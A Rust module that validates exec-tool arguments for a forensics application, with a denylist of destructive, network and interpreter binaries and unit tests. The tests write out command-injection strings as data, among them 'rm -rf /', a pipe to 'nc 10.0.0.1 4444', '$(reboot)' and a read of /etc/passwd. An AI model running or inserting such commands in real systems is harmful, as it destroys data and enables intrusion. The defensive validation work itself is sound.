//! `argsafe` — typed defense-in-depth validation for the exec-tool argv surface.
//!
//! The long-tail typed exec verbs (`vol_run`, `ez_parse`, `plaso_parse`,
//! `mac_triage`) are already locked down at their primary boundary: each takes an
//! **allow-listed** verb (plugin / tool / parser / module) plus typed scalars
//! (`PathBuf`, `u32` pid, `usize` limit) — never a free-form/passthrough arg —
//! and spawns execFile-style (`Command::new(bin).args(argv)`, never `sh -c`), so a
//! shell metacharacter in a path is inert (one literal argv element).
//!
//! This module is the defense-in-depth layer that stays correct even if those
//! invariants slip:
//!
//!   * [`guard_spawn`] is the pre-spawn gate the live tools call. It refuses a
//!     binary whose basename is on a denylist (`rm`/`dd`/`curl`/`bash`/`python`…)
//!     — the binaries resolve from `$VOLATILITY_BIN`/`$EZTOOLS_DIR`/`$PLASO_DIR`/
//!     PATH, and `resolve_binary` only checks `is_file()`, so a poisoned env var
//!     pointing at a dangerous binary would otherwise be spawned — and rejects any
//!     argument (or the binary path) carrying an embedded NUL byte.
//!
//!   * [`validate_passthrough_args`] is the contract for any *future* free-form
//!     arg field: it rejects shell-metacharacter / command-substitution /
//!     redirection constructs, embedded NULs, and tool-native write/output flags
//!     (`-o`, `--output`, `--output-dir`, `--outdir`, `--dump`, `-C`, plus the
//!     `-oPATH` / `--output=PATH` glue forms) whose value resolves under an
//!     evidence/mount root. No live tool exposes such a field today; wiring this
//!     helper in is mandatory the moment one does.
//!
//! All checks are pure functions so the contract is unit-pinned and can't regress.

use std::ffi::OsStr;
use std::path::{Component, Path, PathBuf};

use thiserror::Error;

/// Binary basenames a read-only DFIR tool must never spawn. Covers destructive
/// filesystem ops, network egress, remote shells, and interpreters that would
/// turn a fixed argv back into arbitrary execution.
const DENIED_BINARIES: &[&str] = &[
    // destructive / filesystem-mutating
    "rm",
    "rmdir",
    "unlink",
    "dd",
    "mkfs",
    "shred",
    "wipefs",
    "fdisk",
    "parted",
    "mv",
    "cp",
    "chmod",
    "chown",
    "chattr",
    "mount",
    "umount",
    "ln",
    "tee",
    "truncate",
    // network egress / remote
    "curl",
    "wget",
    "nc",
    "ncat",
    "netcat",
    "socat",
    "ssh",
    "scp",
    "sftp",
    "ftp",
    "tftp",
    "telnet",
    "rsync",
    // shells / interpreters
    "sh",
    "bash",
    "zsh",
    "dash",
    "ksh",
    "csh",
    "tcsh",
    "fish",
    "ash",
    "busybox",
    "python",
    "python2",
    "python3",
    "perl",
    "ruby",
    "php",
    "node",
    "lua",
    "awk",
    "gawk",
    "powershell",
    "pwsh",
    "cmd",
    // process / privilege manipulation
    "eval",
    "exec",
    "env",
    "xargs",
    "sudo",
    "su",
    "doas",
    "setsid",
    "nohup",
    "kill",
    "killall",
];

/// Tool-native flags that name a write/output destination (split form, where the
/// value is the *next* argv element).
const OUTPUT_FLAG_NAMES: &[&str] = &[
    "-o",
    "--output",
    "--output-dir",
    "--outdir",
    "--out-dir",
    "--dump",
    "--dump-dir",
    "-C",
    "--csv",
    "-w",
    "--write",
];

/// Typed reasons an argv was refused.
#[derive(Debug, Error, PartialEq, Eq)]
pub enum ArgSafetyError {
    /// An argument (or the binary path) carries an embedded NUL byte.
    #[error("argument {0:?} contains an embedded NUL byte")]
    NullByte(String),

    /// The resolved binary's basename is on the spawn denylist.
    #[error(
        "refusing to spawn denied binary basename {0:?} (a read-only DFIR verb must \
         never invoke a destructive/network/shell/interpreter binary)"
    )]
    DeniedBinary(String),

    /// A free-form argument contains a shell-metacharacter / substitution /
    /// redirection construct.
    #[error(
        "free-form argument {0:?} contains a shell metacharacter or \
         command-substitution/redirection construct"
    )]
    ShellMetachar(String),

    /// A free-form write/output flag points under an evidence/mount root.
    #[error(
        "free-form write/output flag {flag:?} resolves to {value:?}, which is under an \
         evidence/mount directory; evidence is read-only"
    )]
    WriteOutputUnderEvidence { flag: String, value: String },
}

/// Shell-significant characters that have no place in a literal forensic argument.
/// Presence of any of these (or a backslash, which on Windows shells is also
/// significant) marks the value as a metacharacter-bearing construct.
const SHELL_METACHARS: &[char] = &[
    ';', '|', '&', '$', '`', '(', ')', '<', '>', '\n', '\r', '*', '?', '[', ']', '{', '}', '!',
    '~', '#', '\'', '"', '\\',
];

/// True if `arg` carries any shell-significant character, command substitution,
/// or redirection construct.
#[must_use]
pub fn contains_shell_metachar(arg: &str) -> bool {
    arg.chars().any(|c| SHELL_METACHARS.contains(&c))
}

/// Reject any argument string carrying an embedded NUL.
fn check_str_nul(arg: &str) -> Result<(), ArgSafetyError> {
    if arg.contains('\0') {
        return Err(ArgSafetyError::NullByte(arg.to_string()));
    }
    Ok(())
}

/// Reject an `OsStr` argument (path or otherwise) carrying an embedded NUL. Works
/// on the raw bytes so a non-UTF-8 path is still checked.
///
/// # Errors
/// [`ArgSafetyError::NullByte`] when the argument contains a `\0` byte.
pub fn reject_null_bytes(arg: &OsStr) -> Result<(), ArgSafetyError> {
    if arg.as_encoded_bytes().contains(&0) {
        return Err(ArgSafetyError::NullByte(arg.to_string_lossy().into_owned()));
    }
    Ok(())
}

/// True if the resolved binary's file name is on the spawn denylist
/// (case-insensitive; a trailing `.exe`/`.py` is stripped first).
#[must_use]
pub fn binary_basename_denied(binary: &Path) -> bool {
    let Some(name) = binary.file_name().and_then(OsStr::to_str) else {
        return false;
    };
    let lower = name.to_ascii_lowercase();
    let stem = lower
        .strip_suffix(".exe")
        .or_else(|| lower.strip_suffix(".py"))
        .unwrap_or(&lower);
    DENIED_BINARIES.contains(&stem)
}

/// Pre-spawn gate the live exec tools call after binary resolution and argv
/// assembly. Fails closed before any subprocess is created.
///
/// # Errors
/// * [`ArgSafetyError::DeniedBinary`] — the binary basename is on the denylist.
/// * [`ArgSafetyError::NullByte`] — the binary path or any argument carries a NUL.
pub fn guard_spawn(binary: &Path, args: &[std::ffi::OsString]) -> Result<(), ArgSafetyError> {
    if binary_basename_denied(binary) {
        let name = binary
            .file_name()
            .and_then(OsStr::to_str)
            .unwrap_or_default()
            .to_string();
        return Err(ArgSafetyError::DeniedBinary(name));
    }
    reject_null_bytes(binary.as_os_str())?;
    for arg in args {
        reject_null_bytes(arg.as_os_str())?;
    }
    Ok(())
}

/// True if `arg` names a split-form write/output flag (value is the next argv).
#[must_use]
pub fn is_output_flag_name(arg: &str) -> bool {
    OUTPUT_FLAG_NAMES.contains(&arg)
}

/// If `arg` is a glued write/output flag (`-oPATH`, `--output=PATH`,
/// `--outdir=PATH`, `-CPATH`, …), return its embedded value.
#[must_use]
pub fn glued_output_value(arg: &str) -> Option<&str> {
    // `--long=value` forms.
    if let Some((flag, value)) = arg.split_once('=') {
        if is_output_flag_name(flag) {
            return Some(value);
        }
    }
    // `-oVALUE` / `-CVALUE` short-flag glue forms.
    for short in ["-o", "-C", "-w"] {
        if let Some(value) = arg.strip_prefix(short) {
            if !value.is_empty() && !value.starts_with('=') {
                return Some(value);
            }
        }
    }
    None
}

/// True if `value` lexically resolves under any of `evidence_roots`.
///
/// Lexical (not filesystem) resolution so it holds for not-yet-created output
/// paths; `..` components are collapsed so an escape attempt can't slip a root
/// prefix.
#[must_use]
pub fn value_under_evidence(value: &str, evidence_roots: &[&Path]) -> bool {
    if evidence_roots.is_empty() {
        return false;
    }
    let normalized = lexical_normalize(Path::new(value));
    evidence_roots
        .iter()
        .map(|r| lexical_normalize(r))
        .any(|root| normalized.starts_with(&root))
}

/// Collapse `.`/`..` components lexically without touching the filesystem.
fn lexical_normalize(path: &Path) -> PathBuf {
    let mut out = PathBuf::new();
    for component in path.components() {
        match component {
            Component::ParentDir => {
                out.pop();
            }
            Component::CurDir => {}
            other => out.push(other.as_os_str()),
        }
    }
    out
}

/// Validate a *free-form passthrough* argument list. No live tool exposes such a
/// field today; this is the mandatory contract for any future one.
///
/// Per-argument it rejects embedded NULs and shell-metacharacter/substitution/
/// redirection constructs, and it rejects write/output flags (both split and
/// glued forms) whose value resolves under an evidence/mount root.
///
/// # Errors
/// * [`ArgSafetyError::NullByte`] — an argument carries a NUL.
/// * [`ArgSafetyError::ShellMetachar`] — an argument carries a shell construct.
/// * [`ArgSafetyError::WriteOutputUnderEvidence`] — a write/output flag targets
///   an evidence/mount path.
pub fn validate_passthrough_args(
    args: &[String],
    evidence_roots: &[&Path],
) -> Result<(), ArgSafetyError> {
    let mut pending_output_flag: Option<&str> = None;
    for arg in args {
        check_str_nul(arg)?;

        // A split-form output flag's value arrives as the next argument.
        if let Some(flag) = pending_output_flag.take() {
            if value_under_evidence(arg, evidence_roots) {
                return Err(ArgSafetyError::WriteOutputUnderEvidence {
                    flag: flag.to_string(),
                    value: arg.clone(),
                });
            }
        }

        if contains_shell_metachar(arg) {
            return Err(ArgSafetyError::ShellMetachar(arg.clone()));
        }

        if is_output_flag_name(arg) {
            pending_output_flag = Some(arg);
            continue;
        }
        if let Some(value) = glued_output_value(arg) {
            if value_under_evidence(value, evidence_roots) {
                return Err(ArgSafetyError::WriteOutputUnderEvidence {
                    flag: arg.clone(),
                    value: value.to_string(),
                });
            }
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::ffi::OsString;

    #[test]
    fn guard_spawn_accepts_a_normal_forensic_binary_and_argv() {
        let bin = PathBuf::from("/usr/bin/vol");
        let args: Vec<OsString> = [
            "-f",
            "/evidence/mem.raw",
            "-r",
            "json",
            "-q",
            "windows.pslist",
        ]
        .iter()
        .map(OsString::from)
        .collect();
        assert_eq!(guard_spawn(&bin, &args), Ok(()));
    }

    #[test]
    fn guard_spawn_rejects_denied_binaries_by_basename() {
        for denied in [
            "/bin/rm",
            "/usr/bin/curl",
            "/usr/bin/bash",
            "/usr/local/bin/python3",
        ] {
            let err = guard_spawn(&PathBuf::from(denied), &[]).unwrap_err();
            assert!(
                matches!(err, ArgSafetyError::DeniedBinary(_)),
                "{denied} should be denied, got {err:?}"
            );
        }
    }

    #[test]
    fn binary_denylist_is_case_and_extension_insensitive() {
        assert!(binary_basename_denied(Path::new("/x/RM")));
        assert!(binary_basename_denied(Path::new(
            "C:/Windows/System32/cmd.exe"
        )));
        assert!(binary_basename_denied(Path::new("/opt/Python3.py")));
        assert!(!binary_basename_denied(Path::new("/usr/bin/vol")));
        assert!(!binary_basename_denied(Path::new("/eztools/AmcacheParser")));
    }

    #[test]
    fn guard_spawn_rejects_null_bytes_in_args_and_binary() {
        let bin = PathBuf::from("/usr/bin/vol");
        let bad_arg = OsString::from("/evidence/mem\0.raw");
        assert!(matches!(
            guard_spawn(&bin, &[bad_arg]).unwrap_err(),
            ArgSafetyError::NullByte(_)
        ));

        let bad_bin = PathBuf::from("/usr/bin/vo\0l");
        assert!(matches!(
            guard_spawn(&bad_bin, &[]).unwrap_err(),
            ArgSafetyError::NullByte(_)
        ));
    }

    #[test]
    fn shell_metachar_detection_flags_injection_constructs() {
        for bad in [
            "windows.pslist; rm -rf /",
            "a && curl evil",
            "x | nc 10.0.0.1 4444",
            "$(reboot)",
            "`id`",
            "out > /evidence/x",
            "in < /etc/passwd",
            "glob*",
            "back\\slash",
        ] {
            assert!(contains_shell_metachar(bad), "{bad} should be flagged");
        }
        for good in [
            "windows.pslist",
            "/evidence/mem.raw",
            "--pid",
            "1234",
            "linux.bash",
        ] {
            assert!(!contains_shell_metachar(good), "{good} should be clean");
        }
    }

    #[test]
    fn passthrough_rejects_shell_metacharacters() {
        let err = validate_passthrough_args(&["ok".into(), "; rm -rf /".into()], &[]).unwrap_err();
        assert!(matches!(err, ArgSafetyError::ShellMetachar(_)));
    }

    #[test]
    fn passthrough_rejects_null_byte_argument() {
        let err = validate_passthrough_args(&["a\0b".into()], &[]).unwrap_err();
        assert!(matches!(err, ArgSafetyError::NullByte(_)));
    }

    #[test]
    fn passthrough_rejects_split_output_flag_under_evidence() {
        let roots = [Path::new("/evidence"), Path::new("/mnt/case")];
        let args = vec!["-o".to_string(), "/evidence/loot".to_string()];
        let err = validate_passthrough_args(&args, &roots).unwrap_err();
        assert!(matches!(
            err,
            ArgSafetyError::WriteOutputUnderEvidence { .. }
        ));
    }

    #[test]
    fn passthrough_rejects_glued_output_flag_forms_under_evidence() {
        let roots = [Path::new("/evidence")];
        for glued in [
            "-o/evidence/x",
            "--output=/evidence/x",
            "--outdir=/evidence/sub/x",
            "-C/evidence/dump",
        ] {
            let err = validate_passthrough_args(&[glued.to_string()], &roots).unwrap_err();
            assert!(
                matches!(err, ArgSafetyError::WriteOutputUnderEvidence { .. }),
                "{glued} should be rejected, got {err:?}"
            );
        }
    }

    #[test]
    fn passthrough_rejects_dotdot_escape_back_into_evidence() {
        let roots = [Path::new("/evidence")];
        let args = vec!["--output=/evidence/sub/../loot".to_string()];
        assert!(matches!(
            validate_passthrough_args(&args, &roots).unwrap_err(),
            ArgSafetyError::WriteOutputUnderEvidence { .. }
        ));
    }

    #[test]
    fn passthrough_allows_output_outside_evidence() {
        let roots = [Path::new("/evidence")];
        let args = vec!["-o".to_string(), "/tmp/run-output".to_string()];
        assert_eq!(validate_passthrough_args(&args, &roots), Ok(()));
    }

    #[test]
    fn glued_output_value_extracts_embedded_paths() {
        assert_eq!(glued_output_value("-o/tmp/x"), Some("/tmp/x"));
        assert_eq!(glued_output_value("--output=/tmp/x"), Some("/tmp/x"));
        assert_eq!(glued_output_value("--outdir=/tmp/x"), Some("/tmp/x"));
        assert_eq!(glued_output_value("-C/tmp/x"), Some("/tmp/x"));
        assert_eq!(glued_output_value("windows.pslist"), None);
        assert_eq!(glued_output_value("-r"), None);
    }
}
